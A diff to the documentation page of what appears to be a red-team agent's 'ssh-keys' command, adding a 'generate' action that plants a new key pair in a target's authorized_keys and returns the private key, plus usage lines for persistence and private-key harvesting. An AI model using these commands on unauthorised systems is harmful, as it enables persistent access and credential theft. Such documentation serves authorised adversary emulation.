@@ -5,18 +5,16 @@ weight = 132
 hidden = false
 +++
 
-{{% notice info %}}Linux/macOS Only{{% /notice %}}
-
 ## Summary
 
-Read or manipulate SSH authorized_keys files for persistence and lateral movement. Can also extract private keys for credential harvesting. Supports targeting other users' `.ssh` directories.
+Read or manipulate SSH authorized_keys files for persistence and lateral movement. Can also extract private keys for credential harvesting, generate new key pairs, and enumerate SSH configuration for lateral movement. Supports targeting other users' `.ssh` directories. Cross-platform: Linux, macOS, and Windows (OpenSSH).
 
 ### Arguments
 
 | Parameter | Type | Required | Default | Description |
 |-----------|------|----------|---------|-------------|
-| action | choose_one | Yes | list | `list`, `add`, `remove`, `read-private`, or `enumerate` |
-| key | string | No | - | SSH public key to add, or substring to match for removal |
+| action | choose_one | Yes | list | `list`, `add`, `remove`, `read-private`, `enumerate`, or `generate` |
+| key | string | No | - | SSH public key to add, substring to match for removal, or `noinstall` for generate without authorized_keys install |
 | user | string | No | current | Target user (reads their `~/.ssh/` directory) |
 | path | string | No | - | Override the default authorized_keys or private key path |
 
@@ -125,6 +123,45 @@ ssh-keys -action enumerate -user admin
 [Private Keys] 2 key(s):
   id_ed25519 (411 bytes, plaintext)
   id_rsa (1766 bytes, encrypted)
+```
+
+### Generate Key Pair (Persistence)
+
+Generate a new ed25519 key pair on the target, install the public key to authorized_keys, and return the private key to the operator:
+```
+ssh-keys -action generate
+```
+
+Generate with a custom key name:
+```
+ssh-keys -action generate -path /home/admin/.ssh/id_backdoor
+```
+
+Generate without installing to authorized_keys:
+```
+ssh-keys -action generate -key noinstall
+```
+
+Generate for a specific user:
+```
+ssh-keys -action generate -user www-data
+```
+
+### Example Output (generate)
+
+```
+Generated ed25519 key pair:
+  Private: /home/setup/.ssh/id_ed25519
+  Public:  /home/setup/.ssh/id_ed25519.pub
+  Installed public key to /home/setup/.ssh/authorized_keys
+
+=== /home/setup/.ssh/id_ed25519 ===
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbm...
+-----END OPENSSH PRIVATE KEY-----
+
+=== /home/setup/.ssh/id_ed25519.pub ===
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...
 ```
 
 ## MITRE ATT&CK Mapping
